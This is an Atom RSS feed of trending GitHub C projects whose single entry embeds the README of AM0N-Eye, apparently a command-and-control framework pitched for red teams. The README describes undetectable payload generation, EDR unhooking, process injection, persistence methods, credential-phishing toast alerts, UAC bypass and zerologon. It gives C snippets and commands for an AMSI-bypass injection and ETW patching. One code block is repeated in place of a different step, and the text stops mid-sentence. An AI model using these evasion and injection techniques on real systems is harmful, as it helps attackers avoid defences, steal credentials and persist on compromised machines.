<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-03-29T01:32:41Z</updated>
  <subtitle>Daily Trending of C in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>momika233/AM0N-Eye</title>
    <updated>2023-03-29T01:32:41Z</updated>
    <id>tag:github.com,2023-03-29:/momika233/AM0N-Eye</id>
    <link href="https://github.com/momika233/AM0N-Eye" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;AM0N-Eye&lt;/h1&gt; &#xA;&lt;p&gt;AM0N-Eye is the most advanced Red Team &amp;amp; Adversary Simulation Software in the current C2 Market. It can not only emulate different stages of an attacker killchain, but also provide a systematic timeline and graph for each of the attacks executed to help the Security Operations Team validate the attacks and improve the internal defensive mechanisms. AM0N-Eye comes prebuilt with several opsOpec features which can ease a Red Team‚Äôs task to focus more on the analytical part of an engagement instead of focusing or depending on Open source tools for post-exploitation. AM0N-Eye is a post-exploitation C2 in the end and however does not provide exploit generation features like metasploit or vulnerability scanning features like Nessus, Acunetix or BurpSuite. AM0N-Eye is a project based on a combination of different ideas and projects used by the threat actor where we observe a set of techniques to evasion EDR and AV while allowing the operator to continue using the tools The C2 standard is specifically designed to succeed in mature environments. Note here that they each have something that sets them apart, such as c2-backed shadow dedicated to Liunx and MacOS, brute ratel and its ability to evasion defensive machines,and also Sliver that support C2 over Mutual TLS (mTLS), WireGuard, HTTP(S), and DNS and are dynamically compiled with per-binary asymmetric encryption keys. Of course, I do not forget Cobaltsetrike, which is the most exploited here because it is the basis of this environment, especially the project that was uploading in the script console and it was the best environment to modify it and add all these features. So what if we combined all these features in one environment that works With the mechanism together, with basic ttps added in any APT attack, and here I will know some TTPs of AM0N-Eye, but not all.&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Linux, MacOS and windows c2 server&lt;/li&gt; &#xA; &lt;li&gt;Fake Alert techniques&lt;/li&gt; &#xA; &lt;li&gt;AV/EDR evasion techniques&lt;/li&gt; &#xA; &lt;li&gt;shellcode Generator &amp;amp; obfuscatior&lt;/li&gt; &#xA; &lt;li&gt;Persistence techniques&lt;/li&gt; &#xA; &lt;li&gt;New BOF&lt;/li&gt; &#xA; &lt;li&gt;AV/EDR Recon&lt;/li&gt; &#xA; &lt;li&gt;PayloadGenerator Undetected by antivirus programs&lt;/li&gt; &#xA; &lt;li&gt;custom malwares&lt;/li&gt; &#xA; &lt;li&gt;New c2 profiles&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/121706460/226493992-1b6194b7-13a3-4ac5-bb3c-d473bbf0dd31.png&#34; alt=&#34;Screenshot from 2023-03-10 11-53-32&#34;&gt;&lt;/p&gt; &#xA;&lt;install&gt; &#xA; &lt;p&gt;chmod +x install.sh&lt;/p&gt; &#xA; &lt;p&gt;chmod +x teamserver.AppImage&lt;/p&gt; &#xA; &lt;p&gt;chmod +x st.AppImage&lt;/p&gt; &#xA; &lt;p&gt;chmod +x start.sh üëàÔ∏è You can modify the start.sh file and put your ip in the run command to make the boot process easier&lt;/p&gt; &#xA; &lt;p&gt;sudo ./install.sh&lt;/p&gt; &#xA; &lt;start&gt; &#xA;  &lt;p&gt;sudo ./teamserver.AppImage &#xA;   &lt;yourip&gt;&#xA;     password &amp;amp; ./st.AppImage&#xA;   &lt;/yourip&gt;&lt;/p&gt; &#xA;  &lt;hr&gt; &#xA;  &lt;p&gt;##PayloadGenerator&lt;/p&gt; &#xA;  &lt;p&gt;Generates every type of Stageless/Staged Payload based off a HTTP/HTTPS Listener Undetected by antivirus programs&lt;/p&gt; &#xA;  &lt;p&gt;Creates /opt/amon-eye/Staged_Payloads, /opt/amon-eye/Stageless_Payloads&lt;/p&gt; &#xA;  &lt;p&gt;#Linux &amp;amp; MacOS C2 Server&lt;/p&gt; &#xA;  &lt;p&gt;A security framework for enterprises and Red Team personnel, supports AM0N-Eye penetration testing of other platforms (Linux / MacOS / ...), supports custom modules, and includes some commonly used penetration modules.&lt;/p&gt; &#xA;  &lt;p&gt;Lateral movement&lt;/p&gt; &#xA;  &lt;pre&gt;&lt;code&gt;Generate beacon of Linux-bind / MacOS-bind type&#xA;The target in the intranet runs ./MacOS-bind.beacon &amp;lt;port&amp;gt; to start the service&#xA;Run connect &amp;lt;targetIP&amp;gt;:&amp;lt;port&amp;gt; in the session&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;p&gt;Examples&lt;/p&gt; &#xA;  &lt;p&gt;The script interpreter such as bash / python / ruby / perl / php in the host can be called directly in the session to execute the script passed into the memory. There is no information in the process, all running content is transferred from the memory to the interpreter&lt;/p&gt; &#xA;  &lt;pre&gt;&lt;code&gt;1.python c:\getsysteminfo.py&#xA;2.python import base64;print base64.b64encode(&#39;whoami&#39;); print &#39;a&#39;*40&#xA;3.php&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;p&gt;Don&#39;t forget to Check C2 profiles in /AM0N-Eye/C2-Profiles/ to bypass network filters To use a custom profile you must start a AM0N-Eye team server and specify your profile at that tim Example ./teamserver [external IP] [password] [/path/to/my.profile] .&lt;/p&gt; &#xA;  &lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/121706460/226558264-db460f06-92f1-445e-b428-80a13a69f487.png&#34; alt=&#34;Screenshot from 2023-03-09 13-47-25&#34;&gt;&lt;/p&gt; &#xA;  &lt;h1&gt;Fake Alert update&lt;/h1&gt; &#xA;  &lt;p&gt;to send toast notifications on behalf on an (installed) application or the computer itself. The user will be asked to supply credentials once they click on the notification toast. The second one is a AM0N-Eye module to launch the phishing attack on connected beacons and you can learn the types of victim&#39;s defense mechanisms and exploit this to issue an update alert or to take action&lt;/p&gt; &#xA;  &lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/121706460/226552401-6666bc29-2b9b-4248-9056-faafe28af324.png&#34; alt=&#34;Screenshot from 2023-02-21 02-42-37&#34;&gt;&lt;/p&gt; &#xA;  &lt;p&gt;#AV/EDR evasion&lt;/p&gt; &#xA;  &lt;p&gt;(AV/EDR evasion) is a payload creation framework for side loading (not injecting) into a legitimate Windows process (bypassing Application Whitelisting controls). Once the DLL loader is loaded into memory, it utilizes a technique to flush an EDR‚Äôs hook out of the system DLLs running in the process&#39;s memory. This works because we know the EDR‚Äôs hooks are placed when a process is spawned. (AV/EDR evasion) can target these DLLs and manipulate them in memory by using the API function VirtualProtect, which changes a section of a process‚Äô memory permissions to a different value, specifically from Execute‚ÄìRead to Read-Write-Execute.&lt;/p&gt; &#xA;  &lt;p&gt;When executed, (AV/EDR evasion) will copy the bytes of the system DLLs stored on disk in C:\Windows\System32. These DLLs are stored on disk ‚Äúclean‚Äù of EDR hooks because they are used by the system to load an unaltered copy into a new process when it‚Äôs spawned. Since EDR‚Äôs only hook these processes in memory, they remain unaltered. (AV/EDR evasion) does not copy the entire DLL file, instead only focuses on the .text section of the DLLs. This section of a DLL contains the executable assembly, and by doing this (AV/EDR evasion) helps reduce the likelihood of detection as re-reading entire files can cause an EDR to detect that there is a modification to a system resource. The data is then copied into the right region of memory by using each function‚Äôs offset. Each function has an offset which denotes the exact number of bytes from the base address where they reside, providing the function‚Äôs location on the stack.&lt;/p&gt; &#xA;  &lt;p&gt;To do this, (AV/EDR evasion) changes the permissions of the .text region of memory using VirtualProtect. Even though this is a system DLL, since it has been loaded into our process (that we control), we can change the memory permissions without requiring elevated privileges.&lt;/p&gt; &#xA;  &lt;p&gt;Once these the hooks are removed, (AV/EDR evasion) then utilizes custom System Calls to load and run shellcode in memory. (AV/EDR evasion) does this even after the EDR hooks are removed to help avoid detection by non-userland, hook-based telemetry gathering tools such as Event Tracing for Windows (ETW) or other event logging mechanisms. These custom system calls are also used to perform the VirtualProtect call to remove the hooks placed by EDRs, described above, to avoid detection by any EDR‚Äôs anti-tamper controls. This is done by calling a custom version of the VirtualProtect syscall, NtProtectVirtualMemory. (AV/EDR evasion) utilizes Golang to generate these loaders and then assembly for these custom syscall functions.&lt;/p&gt; &#xA;  &lt;p&gt;(AV/EDR evasion) loads the shellcode into memory by first decrypting the shellcode, which is encrypted by default using AES encryption with a decryption and initialization vector key. Once decrypted and loaded, the shellcode is then executed. Depending on the loader options specified (AV/EDR evasion) will set up different export functions for the DLL. The loaded DLL also does not contain the standard DLLmain function which all DLLs typically need to operate. The DLL will still execute without any issue because the process we load into will look for those export functions and not worry about DLLMain being there.&lt;/p&gt; &#xA;  &lt;hr&gt; &#xA;  &lt;table&gt; &#xA;   &lt;thead&gt; &#xA;    &lt;tr&gt; &#xA;     &lt;th&gt;Various Out-Of-Box Evasion Capabilities&lt;/th&gt; &#xA;    &lt;/tr&gt; &#xA;   &lt;/thead&gt; &#xA;   &lt;tbody&gt; &#xA;    &lt;tr&gt; &#xA;     &lt;td&gt;Evasion Capabilities x64 Support x86&lt;/td&gt; &#xA;    &lt;/tr&gt; &#xA;    &lt;tr&gt; &#xA;     &lt;td&gt;Indirect System Calls Yes Yes Yes&lt;/td&gt; &#xA;    &lt;/tr&gt; &#xA;    &lt;tr&gt; &#xA;     &lt;td&gt;Hide Shellcode Sections in Memory Yes&lt;/td&gt; &#xA;    &lt;/tr&gt; &#xA;    &lt;tr&gt; &#xA;     &lt;td&gt;Multiple Sleeping Masking Techniques Yes&lt;/td&gt; &#xA;    &lt;/tr&gt; &#xA;    &lt;tr&gt; &#xA;     &lt;td&gt;Unhook EDR Userland Hooks and Dlls Yes&lt;/td&gt; &#xA;    &lt;/tr&gt; &#xA;    &lt;tr&gt; &#xA;     &lt;td&gt;LoadLibrary Proxy for ETW Evasion Yes&lt;/td&gt; &#xA;    &lt;/tr&gt; &#xA;    &lt;tr&gt; &#xA;     &lt;td&gt;Thread Stack Encryption Yes Yes&lt;/td&gt; &#xA;    &lt;/tr&gt; &#xA;    &lt;tr&gt; &#xA;     &lt;td&gt;Badger Heap Encryption Yes Yes&lt;/td&gt; &#xA;    &lt;/tr&gt; &#xA;    &lt;tr&gt; &#xA;     &lt;td&gt;Masquerade Thread Stack Frame Yes Yes&lt;/td&gt; &#xA;    &lt;/tr&gt; &#xA;    &lt;tr&gt; &#xA;     &lt;td&gt;Hardware Breakpoint for AMSI/ETW Evasion&lt;/td&gt; &#xA;    &lt;/tr&gt; &#xA;    &lt;tr&gt; &#xA;     &lt;td&gt;Reuse Virtual Memory For ETW Evasion Yes&lt;/td&gt; &#xA;    &lt;/tr&gt; &#xA;    &lt;tr&gt; &#xA;     &lt;td&gt;Reuse Existing Libraries from PEB Yes&lt;/td&gt; &#xA;    &lt;/tr&gt; &#xA;    &lt;tr&gt; &#xA;     &lt;td&gt;Secure Free Badger Heap for Volatility Evasion&lt;/td&gt; &#xA;    &lt;/tr&gt; &#xA;    &lt;tr&gt; &#xA;     &lt;td&gt;______________________________________________&lt;/td&gt; &#xA;    &lt;/tr&gt; &#xA;   &lt;/tbody&gt; &#xA;  &lt;/table&gt; &#xA;  &lt;p&gt;(AV/EDR evasion) contains the ability to do process injection attacks. To avoid any hooking or detection in either the loader process or the injected process itself, (AV/EDR evasion) first unhooks the loader process as it would normally, to ensure there are no hooks in the process. Once completed, the loader will then spawn the process specified in the creation command. Once spawned, the loader will then create a handle to the process to retrieve a list of loaded DLLs. Once it finds DLLs, it will enumerate the base address of each DLL in the remote process. Using the function WriteProcessMemory the loader will then write the bytes of the system DLLs stored on disk (since they are ‚Äúclean‚Äù of EDR hooks) without the need to change the memory permissions first. (AV/EDR evasion) uses WriteProcessMemory because this function contains a feature primarily used in debugging where even if a section of memory is read-only, if everything is correct in the call to Write¬≠Process¬≠Memory, it will temporarily change the permission to read-write, update the memory section and then restore the original permissions. Once this is done, the loader can inject shellcode into the spawned process with no issue, as there are no EDR hooks in either process.&lt;/p&gt; &#xA;  &lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/121706460/226556701-11379ed8-66de-4303-9daf-aca85f78af85.png&#34; alt=&#34;Screenshot from 2023-03-21 04-48-45&#34;&gt;&lt;/p&gt; &#xA;  &lt;p&gt;#shellcode obfuscatior&lt;/p&gt; &#xA;  &lt;p&gt;Generates beacon stageless shellcode with exposed exit method, additional formatting, encryption, encoding, compression, multiline output, etc shellcode transforms are generally performed in descending menu order Requirements: The optional AES encryption option uses a python script in the /assets folder Depends on the pycryptodome package to be installed to perform the AES encryption&lt;/p&gt; &#xA;  &lt;p&gt;Install pycryptodome with pip depending on your python environment:&lt;/p&gt; &#xA;  &lt;p&gt;python -m pip install pycryptodome python3 -m pip install pycryptodome py -3 -m pip install pycryptodome py -2 -m pip install pycryptodome&lt;/p&gt; &#xA;  &lt;p&gt;Listener: Select a valid listener with the &#34;...&#34; button. Shellcode will be generated form this listener selection&lt;/p&gt; &#xA;  &lt;p&gt;Delivery: Stageless (Staged not supported for the shellcode generator)&lt;/p&gt; &#xA;  &lt;p&gt;Exit Method: process - exits the entire process that beacon is present in when the beacon is closed thread - exits only the thread in which beacon is running when the beacon is closed&lt;/p&gt; &#xA;  &lt;p&gt;Local Pointers Checkbox: May use if you are going to execute the shellcode from an existing Beacon Generates a Beacon shellcode payload that inherits key function pointers from a same-arch parent Beacon&lt;/p&gt; &#xA;  &lt;p&gt;Existing Session: Only used if the Local Pointers checkbox is checked The parent Beacon session where the shellcode will pull session metadata Shellcode should be run from within this Beacon session&lt;/p&gt; &#xA;  &lt;p&gt;x86 Checkbox: Check to generate x86 shellcode, x64 is generated by default&lt;/p&gt; &#xA;  &lt;p&gt;Or Use Shellcode File: Use an externally generated raw shellcode file in lieu of generating Beacon shellcode This allows you to use previously exported shellcode files or output from other tools (Donut, msfvenom, etc)&lt;/p&gt; &#xA;  &lt;p&gt;Formatting:&lt;/p&gt; &#xA;  &lt;p&gt;raw - raw binary shellcode output, no formatting applied hex - hex formatted shellcode output 0x90,0x90,0x90 - shellcode formatted into a C# style byte array (example format, does not prepend nulls) 0x90uy;0x90uy;0x90uy - shellcode formatted into a F# style byte array (example format, does not prepend nulls) \x90\x90\x90 - shellcode formatted into a C\C++ style byte array (example format, does not prepend nulls) b64 - option to base64 encode the shellcode early in the generation process (before any encryption)&lt;/p&gt; &#xA;  &lt;p&gt;XOR Encrypt Shellcode Checkbox: Check to XOR encrypt the shellcode (only one encryption type can be selected at a time)&lt;/p&gt; &#xA;  &lt;p&gt;XOR Key(s): Randomly generated and editable XOR key character(s) to use for encryption Multiple characters will result in multiple rounds of XOR encryption (i.e. ABCD)&lt;/p&gt; &#xA;  &lt;p&gt;AES Encrypt Shellcode Checkbox: Check to AES encrypt the shellcode (only one encryption type can be selected at a time) Uses a python script to perform AES Block Cipher AES-CBC encryption Shellcode is padded with \0 values to reach block size requirements A randomly generated IV is prepended to the encrypted shellcode data&lt;/p&gt; &#xA;  &lt;p&gt;AES Key: Randomly generated and editable AES key to use for encryption 32byte key is generated and preferred for 256bit encryption strength Encryption key byte lengths accepted are 16, 24, and 32&lt;/p&gt; &#xA;  &lt;p&gt;Encoding/Compression: none - No additional encoding or compression is done to the shellcode b64 - base64 encode the shellcode gzip then b64 - gzip compress then base64 the shellcode gzip - gzip compress the shellcode b64 then gzip - base64 then gzip compress the shellcode b64 then 7xgzip - base64 then gzip compress the shellcode 7 times&lt;/p&gt; &#xA;  &lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/121706460/226556899-c1253b00-8e08-469c-9a46-f1012b1f2795.png&#34; alt=&#34;Screenshot from 2023-03-21 04-46-30&#34;&gt;&lt;/p&gt; &#xA;  &lt;h1&gt;Persistence threat _Menu&lt;/h1&gt; &#xA;  &lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/121706460/226559912-31bc0747-925d-4e51-8697-ad59c52b88dc.jpg&#34; alt=&#34;VideoCapture_20230309-223248&#34;&gt;&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;(UserSchtasksPersist)&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA;  &lt;p&gt;Schtasks Persistence that runs as current user for the selected beacon&lt;/p&gt; &#xA;  &lt;p&gt;Meant for quick user level persistence upon initial access&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;(ServiceEXEPersist)&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA;  &lt;p&gt;Admin Level Custom Service EXE Persistence&lt;/p&gt; &#xA;  &lt;p&gt;Runs as elevated user/SYSTEM for the selected beacon&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;(WMICEventPersist)&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA;  &lt;p&gt;Generates a Custom WMI Event using WMIC for SYSTEM Level persistence on selected beacon&lt;/p&gt; &#xA;  &lt;p&gt;Very syntax heavy, Test first before using on live targets&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;(StartupGPOPersist)&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA;  &lt;p&gt;Generates a Local GPO Entry in psscripts.ini to call a .ps1 script file for persistence on selected beacon&lt;/p&gt; &#xA;  &lt;p&gt;Calls back as SYSTEM&lt;/p&gt; &#xA;  &lt;p&gt;Check permissions with GPO Enumeration (Successful GroupPolicy Directory Listing) first before executing&lt;/p&gt; &#xA;  &lt;p&gt;Beacon execution will cause winlogon.exe to hang and the end user can&#39;t login. Once the new beacon checks in inject into another process and kill the original. Update to come out soon.&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;(RegistryPersist)&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA;  &lt;p&gt;Creates a Custom Registry Key, Value, Type, and Payload Location based on user input for selected beacon&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;(HKCURunKeyPSRegistryPersist)&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA;  &lt;p&gt;Creates two Custom Registry Run Key entries in HKCU&lt;/p&gt; &#xA;  &lt;p&gt;The Payload is a base64 encoded powershell payload based off your HTTP/HTTPS listener&lt;/p&gt; &#xA;  &lt;p&gt;#(Manual persistence)&lt;/p&gt; &#xA;  &lt;p&gt;is an extension for AM0N-Eye persistence by leveraging the execute_assembly function with the SharpStay .NET assembly. handles payload creation by reading the template files for a specific execution type. The persistence menu will be added to the beacon. Due to the nature of how each technique is different there is only a GUI menu and no beacon commands.&lt;/p&gt; &#xA;  &lt;p&gt;Available options:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;ElevatedRegistryKey&lt;/li&gt; &#xA;   &lt;li&gt;UserRegistryKey&lt;/li&gt; &#xA;   &lt;li&gt;UserInitMprLogonScriptKey&lt;/li&gt; &#xA;   &lt;li&gt;ElevatedUserInitKey&lt;/li&gt; &#xA;   &lt;li&gt;ScheduledTask&lt;/li&gt; &#xA;   &lt;li&gt;ListScheduledTasks&lt;/li&gt; &#xA;   &lt;li&gt;ScheduledTaskAction&lt;/li&gt; &#xA;   &lt;li&gt;SchTaskCOMHijack&lt;/li&gt; &#xA;   &lt;li&gt;CreateService&lt;/li&gt; &#xA;   &lt;li&gt;ListRunningServices&lt;/li&gt; &#xA;   &lt;li&gt;WMIEventSub&lt;/li&gt; &#xA;   &lt;li&gt;GetScheduledTaskCOMHandler&lt;/li&gt; &#xA;   &lt;li&gt;JunctionFolder&lt;/li&gt; &#xA;   &lt;li&gt;StartupDirectory&lt;/li&gt; &#xA;   &lt;li&gt;NewLNK&lt;/li&gt; &#xA;   &lt;li&gt;BackdoorLNK&lt;/li&gt; &#xA;   &lt;li&gt;ListTaskNames&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA;  &lt;p&gt;Dependencies&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Mono (MCS) for compiling .NET assemblies (Used with dynamic payload creation)&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA;  &lt;p&gt;##AVQuery&lt;/p&gt; &#xA;  &lt;pre&gt;&lt;code&gt;Queries the Registry with powershell for all AV Installed on the target&#xA;&#xA;Quick and easy way to get the AV you are dealing with as an attacker&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;p&gt;##checkmate request version of the checkmate request Web Delivery attack&lt;/p&gt; &#xA;  &lt;pre&gt;&lt;code&gt;Stageless Web Delivery using checkmate.exe &#xA;&#xA;Powerpick is used to spawn checkmate.exe to download the stageless payload on target and execute with rundll32.exe&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;p&gt;##Curl-TLS&lt;/p&gt; &#xA;  &lt;p&gt;simple web requests without establishing SOCKS PROXY. Example use case could be confirming outbound access to specific service before deploying a relay from [F-Secure&#39;s C3]&lt;/p&gt; &#xA;  &lt;p&gt;#AV/EDR Recon &amp;amp; EDR exact query&lt;/p&gt; &#xA;  &lt;p&gt;As a red-team practitioner, we are often using tools that attempt to fingerprint details about a compromised system, preferably in the most stealthy way possible. Some of our usual tooling for this started getting flagged by EDR products, due to the use of Windows CLI commands. This aims to solve that problem by only probing the system using native registry queries, no CLI commands.&lt;/p&gt; &#xA;  &lt;h1&gt;Active-Evilentry&lt;/h1&gt; &#xA;  &lt;p&gt;job to execute as your current user context. This job will be executed every time the user logs in. Currently only works on Windows 7, 8, Server 2008, Server 2012.&lt;/p&gt; &#xA;  &lt;h1&gt;BypassUAC-eventvwr&lt;/h1&gt; &#xA;  &lt;p&gt;silentcleanup UAC bypass that bypasses &#34;always notify&#34; aka the highest UAC setting, even on Windows&lt;/p&gt; &#xA;  &lt;p&gt;#info_Advanced&lt;/p&gt; &#xA;  &lt;p&gt;A common collection of OS commands, and Red Team Tips for when you have no Google or RTFM on hand.&lt;/p&gt; &#xA;  &lt;p&gt;#BOF &amp;amp; (New command)&lt;/p&gt; &#xA;  &lt;pre&gt;&lt;code&gt;AV_Query                  Queries the Registry for AV Installed&#xA;FindModule                Find loaded modules.&#xA;FindProcHandle            Find specific process handles.&#xA;amsi-inject               Bypass AMSI in a remote process with code injection.&#xA;blockdlls                 Block non-Microsoft DLLs in child processes&#xA;bypassuac-eventvwr        Bypass UAC using Eventvwr Fileless UAC bypass via. Powershell SMB Beacon&#xA;cThreadHijack             cThreadHijack: Remote process injection via thread hijacking&#xA;dllinject                 Inject a Reflective DLL into a process&#xA;dllload                   Load DLL into a process with LoadLibrary()&#xA;edr_query                 Queries the remote or local system for all major EDR products installed&#xA;etw                       Start or stop ETW logging.&#xA;execute-assembly          Execute a local .NET program in-memory on target&#xA;info_RTFM                 A large repository of commands and red team tips&#xA;kerberos_ccache_use       Apply kerberos ticket from cache to this session&#xA;kerberos_ticket_purge     Purge kerberos tickets from this session&#xA;kerberos_ticket_use       Apply kerberos ticket to this session&#xA;process-hollowing         EarlyBird process hollowing technique - Spawns a process in a suspended state, injects shellcode, hijack main&#xA;thread with APC, and execute shellcode.&#xA;regenum                   System, AV, and EDR profiling via registry queries&#xA;shinject                  Inject shellcode into a process&#xA;show_beacon_downloads     Show all Downloads associated with your current Beacon.&#xA;show_sync_location        Shows sync location for downloads.&#xA;static_syscalls_apc_shspawnSpawn process and use syscalls to execute custom shellcode launch with Nt functions (NtMapViewOfSection -&amp;gt; NtQueueUserApc).&#xA;static_syscalls_apc_spawn Spawn process and use syscalls to execute beacon shellcode launch with Nt functions (NtMapViewOfSection -&amp;gt; NtQueueUserApc).&#xA;static_syscalls_dump      Use static syscalls to dump a given PID and save to disk&#xA;static_syscalls_inject    Use static syscalls to execute CRT beacon shellcode launch with Nt functions.&#xA;static_syscalls_shinject  Use static syscalls to execute custom shellcode launch with Nt functions.&#xA;sync_all_beacon_downloads Sync all Downloads.&#xA;sync_beacon_downloads     Sync all Downloads from current Beacon.&#xA;syscalls_inject           Use syscalls from on-disk dll to execute CRT beacon shellcode launch with Nt functions.&#xA;syscalls_shinject         Use syscalls from on-disk dll to execute custom shellcode launch with Nt functions.&#xA;unhook                    remove hooks from DLLs in this process&#xA;zerologon                 Reset DC machine account password with CVE-2020-1472&#xA;&#xA;&#xA;__________________________________________________________________________________________________________________________________&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;h2&gt;AM0N-Eye BOF - Inject AMSI Bypass&lt;/h2&gt; &#xA;  &lt;p&gt;AM0N-Eye Beacon Object File (BOF) that bypasses AMSI in a remote process with code injection.&lt;/p&gt; &#xA;  &lt;h3&gt;What does this do?&lt;/h3&gt; &#xA;  &lt;h5&gt;1. Use supplied PID argument to get a handle on the remote process&lt;/h5&gt; &#xA;  &lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;hProc = KERNEL32$OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, (DWORD)pid);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;h5&gt;2. Load AMSI.DLL into beacons memory and get the address of AMSI.AmsiOpenSession&lt;/h5&gt; &#xA;  &lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;hProc = KERNEL32$OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, (DWORD)pid);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Both beacon and the target process will both have the same address for the symbol.&lt;/li&gt; &#xA;   &lt;li&gt;If AMSI.DLL does not exist in the remote process, running this may crash the target process.&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA;  &lt;h5&gt;3. Write the AMSI bypass to the remote processes memory&lt;/h5&gt; &#xA;  &lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;unsigned char amsibypass[] = { 0x48, 0x31, 0xC0 }; // xor rax, rax&#xA;BOOL success = KERNEL32$WriteProcessMemory(hProc, amsiOpenSessAddr, (PVOID)amsibypass, sizeof(amsibypass), &amp;amp;bytesWritten);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;h3&gt;Method = AMSI.AmsiOpenSession&lt;/h3&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Uses the AMSI bypass technique taught in Offensive Security&#39;s PEN-300/OSEP (Evasion Techniques and Breaching Defenses) course. &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://www.offensive-security.com/pen300-osep/&#34;&gt;https://www.offensive-security.com/pen300-osep/&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA;  &lt;h3&gt;Compile with x64 MinGW:&lt;/h3&gt; &#xA;  &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;x86_64-w64-mingw32-gcc -c amsi-inject.c -o amsi-inject.o&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;h3&gt;Run from AM0N-Eye Beacon Console&lt;/h3&gt; &#xA;  &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;beacon&amp;gt; amsi-inject &amp;lt;PID&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;h3&gt;To Do List&lt;/h3&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Check that AMSI.DLL exists in remote process before injection&lt;/li&gt; &#xA;   &lt;li&gt;Add other AMSI bypasses to inject&lt;/li&gt; &#xA;   &lt;li&gt;Support x86&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA;  &lt;h2&gt;ETW Patching BOF&lt;/h2&gt; &#xA;  &lt;p&gt;Simple Beacon object file to patch (and revert) the EtwEventWrite function in ntdll.dll to degrade ETW based logging.&lt;/p&gt; &#xA;  &lt;h2&gt;Compile&lt;/h2&gt; &#xA;  &lt;pre&gt;&lt;code&gt;x86_64-w64-mingw32-gcc -c etw.c -o etw.x64.o&#xA;i686-w64-mingw32-gcc -c etw.c -o etw.x86.o&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;h2&gt;Usage&lt;/h2&gt; &#xA;  &lt;p&gt;&lt;code&gt;etw start&lt;/code&gt; and &lt;code&gt;etw stop&lt;/code&gt; commands.&lt;/p&gt; &#xA;  &lt;p&gt;Patch bytes returned to confirm activity.&lt;/p&gt; &#xA;  &lt;pre&gt;&lt;code&gt;beacon&amp;gt; help etw&#xA;etw stop - patch out EtwEventWrite in Ntdll.dll to prevent ETW-based logging.&#xA;etw start - patch back in EtwEventWrite in Ntdll.dll to restart ETW-based logging.&#xA;&#xA;beacon&amp;gt; etw stop&#xA;[*] Running ETW patching BOF (@ajpc500)&#xA;[+] host called home, sent: 1391 bytes&#xA;[+] received output:&#xA;Action: stop&#xA;Working with 32-bit.&#xA;[+] received output:&#xA;c2&#xA;[+] received output:&#xA;14&#xA;[+] received output:&#xA;0&#xA;[+] received output:&#xA;0&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;h3&gt;How do I set this up?&lt;/h3&gt; &#xA;  &lt;p&gt;We will not supply compiled binaries. You will have to do this yourself:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Clone this repository.&lt;/li&gt; &#xA;   &lt;li&gt;Make sure you have the Mingw-w64 compiler installed. On Mac OSX for example, you can use the ports collection to install Mingw-w64 (&lt;code&gt;sudo port install mingw-w64&lt;/code&gt;).&lt;/li&gt; &#xA;   &lt;li&gt;Run the &lt;code&gt;make&lt;/code&gt; command to compile the Beacon object file.&lt;/li&gt; &#xA;   &lt;li&gt;Within a AM0N-Eye beacon context use the &lt;code&gt;FindProcHandle&lt;/code&gt; or &lt;code&gt;FindModule&lt;/code&gt; command with the required parameters (e.g. module or process 